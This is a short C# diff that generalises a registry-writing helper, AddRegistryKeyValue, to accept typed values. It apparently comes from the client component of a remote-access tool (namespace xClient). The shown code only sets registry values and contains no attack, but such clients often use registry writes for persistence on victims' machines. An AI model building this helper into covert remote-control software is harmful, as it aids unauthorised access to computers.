@@ -20,7 +20,7 @@ namespace xClient.Core.Helper
         /// <param name="value">The value.</param>
         /// <param name="addQuotes">If set to True, adds quotes to the value.</param>
         /// <returns>True on success, else False.</returns>
-        public static bool AddRegistryKeyValue(RegistryHive hive, string path, string name, string value, bool addQuotes = false)
+        public static bool AddRegistryKeyValue(RegistryHive hive, string path, string name, object value, bool addQuotes = false, RegistryValueKind kind = RegistryValueKind.String)
         {
             try
             {
@@ -28,10 +28,18 @@ namespace xClient.Core.Helper
                 {
                     if (key == null) return false;
 
-                    if (addQuotes && !value.StartsWith("\"") && !value.EndsWith("\""))
-                        value = "\"" + value + "\"";
+                   
 
-                    key.SetValue(name, value);
+                    if (kind != RegistryValueKind.String)
+                    {
+                        key.SetValue(name, value, kind);
+                    }
+                    else
+                    {
+                        if (addQuotes && !((string)value).StartsWith("\"") && !((string)value).EndsWith("\""))
+                            value = "\"" + value + "\"";
+                        key.SetValue(name, value as string);
+                    }
                     return true;
                 }
             }
